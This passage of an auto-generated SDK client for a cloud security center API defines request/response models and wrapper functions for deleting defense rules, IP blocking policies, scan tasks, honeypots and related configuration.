    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteBinarySecurityPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes a binary security policy from the container signature feature.
 *
 * @param request DeleteBinarySecurityPolicyRequest
 * @return DeleteBinarySecurityPolicyResponse
 */
async function deleteBinarySecurityPolicy(request: DeleteBinarySecurityPolicyRequest): DeleteBinarySecurityPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteBinarySecurityPolicyWithOptions(request, runtime);
}

model DeleteClientUserDefineRuleRequest {
  idList?: [ long ](name='IdList', description='The IDs of the custom defense rules.

This parameter is required.'),
}

model DeleteClientUserDefineRuleResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4552b59b-18f2-4fad-b6a2-0d59b8f2****'),
}

model DeleteClientUserDefineRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteClientUserDefineRuleResponseBody(name='body'),
}

/**
 * @summary Deletes specified custom defense rules.
 *
 * @param request DeleteClientUserDefineRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteClientUserDefineRuleResponse
 */
async function deleteClientUserDefineRuleWithOptions(request: DeleteClientUserDefineRuleRequest, runtime: Util.RuntimeOptions): DeleteClientUserDefineRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.idList)) {
    query['IdList'] = request.idList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteClientUserDefineRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes specified custom defense rules.
 *
 * @param request DeleteClientUserDefineRuleRequest
 * @return DeleteClientUserDefineRuleResponse
 */
async function deleteClientUserDefineRule(request: DeleteClientUserDefineRuleRequest): DeleteClientUserDefineRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteClientUserDefineRuleWithOptions(request, runtime);
}

model DeleteCloudVendorAccountAKRequest {
  authId?: long(name='AuthId', description='The unique ID of the AccessKey pair.

This parameter is required.', example='2363'),
  authModules?: [ string ](name='AuthModules', description='The modules that are associated with the AccessKey pair.'),
}

model DeleteCloudVendorAccountAKResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='4539D402-F7A4-5915-9580-EC227BF*****'),
}

model DeleteCloudVendorAccountAKResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteCloudVendorAccountAKResponseBody(name='body'),
}

/**
 * @summary 删除多云资产同步配置
 *
 * @param request DeleteCloudVendorAccountAKRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteCloudVendorAccountAKResponse
 */
async function deleteCloudVendorAccountAKWithOptions(request: DeleteCloudVendorAccountAKRequest, runtime: Util.RuntimeOptions): DeleteCloudVendorAccountAKResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.authId)) {
    query['AuthId'] = request.authId;
  }
  if (!Util.isUnset(request.authModules)) {
    query['AuthModules'] = request.authModules;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteCloudVendorAccountAK',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary 删除多云资产同步配置
 *
 * @param request DeleteCloudVendorAccountAKRequest
 * @return DeleteCloudVendorAccountAKResponse
 */
async function deleteCloudVendorAccountAK(request: DeleteCloudVendorAccountAKRequest): DeleteCloudVendorAccountAKResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteCloudVendorAccountAKWithOptions(request, runtime);
}

model DeleteContainerDefenseRuleRequest {
  ruleIds?: [ long ](name='RuleIds', description='The IDs of the rules that you want to delete.

>  You can call the [ListContainerDefenseRule](https://help.aliyun.com/document_detail/2590599.html) operation to query the rule IDs.'),
}

model DeleteContainerDefenseRuleResponseBody = {
  code?: string(name='Code', description='The status code that is returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: long(name='Data', description='The number of deleted rules.', example='1'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code. The value 200 indicates that the request was successful.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='47365EC5-**-6DEA1788EB11'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model DeleteContainerDefenseRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteContainerDefenseRuleResponseBody(name='body'),
}

/**
 * @summary Deletes a rule for non-image program defense.
 *
 * @param request DeleteContainerDefenseRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteContainerDefenseRuleResponse
 */
async function deleteContainerDefenseRuleWithOptions(request: DeleteContainerDefenseRuleRequest, runtime: Util.RuntimeOptions): DeleteContainerDefenseRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.ruleIds)) {
    query['RuleIds'] = request.ruleIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteContainerDefenseRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes a rule for non-image program defense.
 *
 * @param request DeleteContainerDefenseRuleRequest
 * @return DeleteContainerDefenseRuleResponse
 */
async function deleteContainerDefenseRule(request: DeleteContainerDefenseRuleRequest): DeleteContainerDefenseRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteContainerDefenseRuleWithOptions(request, runtime);
}

model DeleteContainerPluginRuleRequest {
  lang?: string(name='Lang', description='The language of the content within the request and the response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  ruleId?: int32(name='RuleId', description='The ID of the rule. You can call the addContainerWebDefenseRule operation to query the ID.

This parameter is required.', example='200022'),
}

model DeleteContainerPluginRuleResponseBody = {
  data?: boolean(name='Data', description='Indicates whether the container plug-in is manually deleted. Valid values:

*   **true**
*   **false**', example='true'),
  requestId?: string(name='RequestId', description='The request ID.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model DeleteContainerPluginRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteContainerPluginRuleResponseBody(name='body'),
}

/**
 * @summary Deletes a defense rule against container escapes.
 *
 * @param request DeleteContainerPluginRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteContainerPluginRuleResponse
 */
async function deleteContainerPluginRuleWithOptions(request: DeleteContainerPluginRuleRequest, runtime: Util.RuntimeOptions): DeleteContainerPluginRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.ruleId)) {
    query['RuleId'] = request.ruleId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteContainerPluginRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes a defense rule against container escapes.
 *
 * @param request DeleteContainerPluginRuleRequest
 * @return DeleteContainerPluginRuleResponse
 */
async function deleteContainerPluginRule(request: DeleteContainerPluginRuleRequest): DeleteContainerPluginRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteContainerPluginRuleWithOptions(request, runtime);
}

model DeleteCustomBlockRecordRequest {
  id?: long(name='Id', description='The ID of the IP address blocking policy.

> You can call the [DescribeCustomBlockRecords](~~DescribeCustomBlockRecords~~) operation to query the ID.

This parameter is required.', example='381**'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
}

model DeleteCustomBlockRecordResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
}

model DeleteCustomBlockRecordResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteCustomBlockRecordResponseBody(name='body'),
}

/**
 * @summary Deletes a specified IP address blocking policy from one or more servers.
 *
 * @param request DeleteCustomBlockRecordRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteCustomBlockRecordResponse
 */
async function deleteCustomBlockRecordWithOptions(request: DeleteCustomBlockRecordRequest, runtime: Util.RuntimeOptions): DeleteCustomBlockRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteCustomBlockRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes a specified IP address blocking policy from one or more servers.
 *
 * @param request DeleteCustomBlockRecordRequest
 * @return DeleteCustomBlockRecordResponse
 */
async function deleteCustomBlockRecord(request: DeleteCustomBlockRecordRequest): DeleteCustomBlockRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteCustomBlockRecordWithOptions(request, runtime);
}

model DeleteCustomizeReportRequest {
  reportId?: long(name='ReportId', description='The ID of the report.

>  You can call the [DescribeCustomizeReportList](~~DescribeCustomizeReportList~~) operation to query the ID.

This parameter is required.', example='123'),
}

model DeleteCustomizeReportResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='90593A3B-85CE-5D87-A430-726D0B87****'),
}

model DeleteCustomizeReportResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteCustomizeReportResponseBody(name='body'),
}

/**
 * @summary Deletes a custom security report.
 *
 * @param request DeleteCustomizeReportRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteCustomizeReportResponse
 */
async function deleteCustomizeReportWithOptions(request: DeleteCustomizeReportRequest, runtime: Util.RuntimeOptions): DeleteCustomizeReportResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.reportId)) {
    query['ReportId'] = request.reportId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteCustomizeReport',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes a custom security report.
 *
 * @param request DeleteCustomizeReportRequest
 * @return DeleteCustomizeReportResponse
 */
async function deleteCustomizeReport(request: DeleteCustomizeReportRequest): DeleteCustomizeReportResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteCustomizeReportWithOptions(request, runtime);
}

model DeleteCustomizedDictRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address.', example='123.103.9.***'),
}

model DeleteCustomizedDictResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='85B5D55F-B341-528F-A2CA-AB1207F9****'),
}

model DeleteCustomizedDictResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteCustomizedDictResponseBody(name='body'),
}

/**
 * @summary Deletes the file that is uploaded to create custom weak password rules.
 *
 * @param request DeleteCustomizedDictRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteCustomizedDictResponse
 */
async function deleteCustomizedDictWithOptions(request: DeleteCustomizedDictRequest, runtime: Util.RuntimeOptions): DeleteCustomizedDictResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteCustomizedDict',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes the file that is uploaded to create custom weak password rules.
 *
 * @param request DeleteCustomizedDictRequest
 * @return DeleteCustomizedDictResponse
 */
async function deleteCustomizedDict(request: DeleteCustomizedDictRequest): DeleteCustomizedDictResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteCustomizedDictWithOptions(request, runtime);
}

model DeleteCycleTaskRequest {
  configId?: string(name='ConfigId', description='The ID of the task configuration.

>  You can call the [DescribeCycleTaskList](~~DescribeCycleTaskList~~) operation to query the IDs of task configurations.

This parameter is required.', example='435f626256ebf564cf5ba966a539****'),
}

model DeleteCycleTaskResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7DBB3D54-AF29-5BF4-8B44-9CFA94F50****'),
}

model DeleteCycleTaskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteCycleTaskResponseBody(name='body'),
}

/**
 * @summary Deletes a periodic scan task. The task can be an image scan task, urgent vulnerability scan task, or virus scan task.
 *
 * @param request DeleteCycleTaskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteCycleTaskResponse
 */
async function deleteCycleTaskWithOptions(request: DeleteCycleTaskRequest, runtime: Util.RuntimeOptions): DeleteCycleTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.configId)) {
    query['ConfigId'] = request.configId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteCycleTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes a periodic scan task. The task can be an image scan task, urgent vulnerability scan task, or virus scan task.
 *
 * @param request DeleteCycleTaskRequest
 * @return DeleteCycleTaskResponse
 */
async function deleteCycleTask(request: DeleteCycleTaskRequest): DeleteCycleTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteCycleTaskWithOptions(request, runtime);
}

model DeleteDingTalkRequest {
  ids?: string(name='Ids', description='The ID of the notification from the DingTalk chatbot. Separate multiple IDs with commas (,).

>  You can call the [DescribeDingTalk](~~DescribeDingTalk~~) operation to query the ID.

This parameter is required.', example='2170,256'),
}

model DeleteDingTalkResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='BF3D4ACB-CE17-559F-B850-490E42CDDC7E'),
}

model DeleteDingTalkResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteDingTalkResponseBody(name='body'),
}

/**
 * @summary Deletes a DingTalk chatbot on the DingTalk Chatbot tab of the Notification Settings page.
 *
 * @param request DeleteDingTalkRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteDingTalkResponse
 */
async function deleteDingTalkWithOptions(request: DeleteDingTalkRequest, runtime: Util.RuntimeOptions): DeleteDingTalkResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.ids)) {
    query['Ids'] = request.ids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteDingTalk',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes a DingTalk chatbot on the DingTalk Chatbot tab of the Notification Settings page.
 *
 * @param request DeleteDingTalkRequest
 * @return DeleteDingTalkResponse
 */
async function deleteDingTalk(request: DeleteDingTalkRequest): DeleteDingTalkResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteDingTalkWithOptions(request, runtime);
}

model DeleteFileProtectRuleRequest {
  id?: [ long ](name='Id', description='The IDs of the core file monitoring rules that you want to delete.'),
}

model DeleteFileProtectRuleResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='7FD1C1DC-AA67-510A-A022-5D23310C3658'),
}

model DeleteFileProtectRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteFileProtectRuleResponseBody(name='body'),
}

/**
 * @summary Deletes core file monitoring rules.
 *
 * @param request DeleteFileProtectRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteFileProtectRuleResponse
 */
async function deleteFileProtectRuleWithOptions(request: DeleteFileProtectRuleRequest, runtime: Util.RuntimeOptions): DeleteFileProtectRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteFileProtectRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes core file monitoring rules.
 *
 * @param request DeleteFileProtectRuleRequest
 * @return DeleteFileProtectRuleResponse
 */
async function deleteFileProtectRule(request: DeleteFileProtectRuleRequest): DeleteFileProtectRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteFileProtectRuleWithOptions(request, runtime);
}

model DeleteGroupRequest {
  groupId?: long(name='GroupId', description='The ID of the server group that you want to delete.

>  To delete a server group, you must provide the ID of the server group. You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the ID.

This parameter is required.', example='9454789'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.172.XX.XX'),
}

model DeleteGroupResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DeleteGroupResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteGroupResponseBody(name='body'),
}

/**
 * @summary Deletes a server group.
 *
 * @description The **Default** server group that is provided by Security Center cannot be deleted. After you delete a group, the assets in this group are moved to the **Default** group.
 *
 * @param request DeleteGroupRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteGroupResponse
 */
async function deleteGroupWithOptions(request: DeleteGroupRequest, runtime: Util.RuntimeOptions): DeleteGroupResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteGroup',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes a server group.
 *
 * @description The **Default** server group that is provided by Security Center cannot be deleted. After you delete a group, the assets in this group are moved to the **Default** group.
 *
 * @param request DeleteGroupRequest
 * @return DeleteGroupResponse
 */
async function deleteGroup(request: DeleteGroupRequest): DeleteGroupResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteGroupWithOptions(request, runtime);
}

model DeleteHoneypotRequest {
  honeypotId?: string(name='HoneypotId', description='The ID of the honeypot.

> You can call the [ListHoneypot](~~ListHoneypot~~) operation to query the IDs of honeypots.

This parameter is required.', example='558b5fa40948ebe2171a74757c54dc7e58f761870fa7ee6a105e70947ec82aa9'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model DeleteHoneypotResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='E14721CB-B32F-56F2-8490-CDA18E4F9268'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model DeleteHoneypotResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteHoneypotResponseBody(name='body'),
}

/**
 * @summary Deletes a specified honeypot.
 *
 * @param request DeleteHoneypotRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteHoneypotResponse
 */
async function deleteHoneypotWithOptions(request: DeleteHoneypotRequest, runtime: Util.RuntimeOptions): DeleteHoneypotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeypotId)) {
    query['HoneypotId'] = request.honeypotId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteHoneypot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes a specified honeypot.
 *
 * @param request DeleteHoneypotRequest
 * @return DeleteHoneypotResponse
 */
async function deleteHoneypot(request: DeleteHoneypotRequest): DeleteHoneypotResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteHoneypotWithOptions(request, runtime);
}

model DeleteHoneypotNodeRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  nodeId?: string(name='NodeId', description='The ID of the management node.

> You can call the [ListHoneypotNode](~~ListHoneypotNode~~) operation to query the IDs of management nodes.

This parameter is required.', example='670baeee-86c4-46b9-8200-a2c38141a453'),
}

model DeleteHoneypotNodeResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='49FDE92F-A0B8-56CC-B7A8-23B17646CCAD'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model DeleteHoneypotNodeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteHoneypotNodeResponseBody(name='body'),
}

/**
 * @summary Deletes a specified management node.
 *
 * @param request DeleteHoneypotNodeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteHoneypotNodeResponse
 */
async function deleteHoneypotNodeWithOptions(request: DeleteHoneypotNodeRequest, runtime: Util.RuntimeOptions): DeleteHoneypotNodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteHoneypotNode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes a specified management node.
 *
 * @param request DeleteHoneypotNodeRequest
 * @return DeleteHoneypotNodeResponse
 */
async function deleteHoneypotNode(request: DeleteHoneypotNodeRequest): DeleteHoneypotNodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteHoneypotNodeWithOptions(request, runtime);
}

model DeleteHoneypotPresetRequest {
  honeypotPresetId?: string(name='HoneypotPresetId', description='The ID of the honeypot template.

> You can call the [ListHoneypotPreset](~~ListHoneypotPreset~~) operation to query the IDs of honeypot templates.

This parameter is required.', example='84104b7b-a2bc-41df-a190-12298f99xxxx'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh'),
}

model DeleteHoneypotPresetResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='1A975D03-5F49-5354-B2CB-3918D5DA431A'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model DeleteHoneypotPresetResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteHoneypotPresetResponseBody(name='body'),
}

/**
 * @summary Deletes a specified honeypot template.
 *
 * @param request DeleteHoneypotPresetRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteHoneypotPresetResponse
 */
async function deleteHoneypotPresetWithOptions(request: DeleteHoneypotPresetRequest, runtime: Util.RuntimeOptions): DeleteHoneypotPresetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeypotPresetId)) {
    query['HoneypotPresetId'] = request.honeypotPresetId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteHoneypotPreset',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
